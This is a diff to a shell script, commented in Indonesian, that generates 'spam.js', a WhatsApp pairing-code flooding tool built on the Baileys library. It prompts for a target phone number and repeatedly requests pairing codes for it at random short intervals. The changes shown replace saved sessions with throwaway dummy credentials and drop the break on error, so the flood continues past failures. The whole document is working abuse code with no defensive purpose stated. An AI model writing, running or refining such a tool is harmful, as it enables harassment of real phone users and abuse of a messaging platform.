@@ -25,9 +25,8 @@ fi
 
 # Buat file spam.js otomatis
 cat <<'EOF' > spam.js
-import makeWASocket, { fetchLatestBaileysVersion, useMultiFileAuthState } from "@whiskeysockets/baileys"
+import makeWASocket, { fetchLatestBaileysVersion, makeInMemoryStore } from "@whiskeysockets/baileys"
 import readline from "readline"
-import fs from "fs"
 
 const rl = readline.createInterface({
   input: process.stdin,
@@ -40,10 +39,6 @@ function getRandomDelay(min, max) {
 
 async function startLoop() {
   const { version } = await fetchLatestBaileysVersion()
-
-  // Auth dummy pake MultiFileAuthState
-  const authFolder = "./session_dummy"
-  const { state, saveCreds } = await useMultiFileAuthState(authFolder)
 
   rl.question("MASUKAN NOMOR TARGET (62): ", async (number) => {
     console.log("════════════════════════════════════")
@@ -62,33 +57,31 @@ async function startLoop() {
         console.log(`Loop dihentikan oleh user (Q). Total code: ${count}`)
         console.log("════════════════════════════════════")
         rl.close()
-        if (fs.existsSync(authFolder)) {
-          fs.rmSync(authFolder, { recursive: true, force: true }) // hapus session dummy
-        }
       }
     })
 
     while (!stop) {
       try {
+        // Socket ephemeral (tanpa session permanen)
         const sock = makeWASocket({
           version,
-          auth: state,
+          auth: {
+            creds: { noiseKey: { private: Buffer.alloc(32), public: Buffer.alloc(32) }, signedIdentityKey: { private: Buffer.alloc(32), public: Buffer.alloc(32) }, signedPreKey: { keyPair: { private: Buffer.alloc(32), public: Buffer.alloc(32) }, signature: Buffer.alloc(32), keyId: 1 }, registrationId: Math.floor(Math.random() * 16384), advSecretKey: Buffer.alloc(32).toString("base64"), nextPreKeyId: 1, firstUnuploadedPreKeyId: 1, accountSettings: { unarchiveChats: false }, account: { details: Buffer.alloc(32), accountSignatureKey: Buffer.alloc(32), accountSignature: Buffer.alloc(32), deviceSignature: Buffer.alloc(32) }, me: { id: "0@s.whatsapp.net", name: "dummy" }, signalIdentities: [], lastAccountSyncTimestamp: 0, platformType: "smba", lastPreKeyId: 1 },
+            keys: {}
+          },
           printQRInTerminal: false
         })
-
-        sock.ev.on("creds.update", saveCreds)
 
         const code = await sock.requestPairingCode(number)
         count++
         console.log(`[${count}] Pairing Code: ${code}`)
 
-        const delay = getRandomDelay(1000, 5000) // 1–5 detik
+        const delay = getRandomDelay(1000, 5000)
         console.log(`   → jeda ${delay / 1000} detik...`)
         await new Promise(r => setTimeout(r, delay))
 
       } catch (e) {
         console.log("Terjadi error:", e.message)
-        break
       }
     }
 
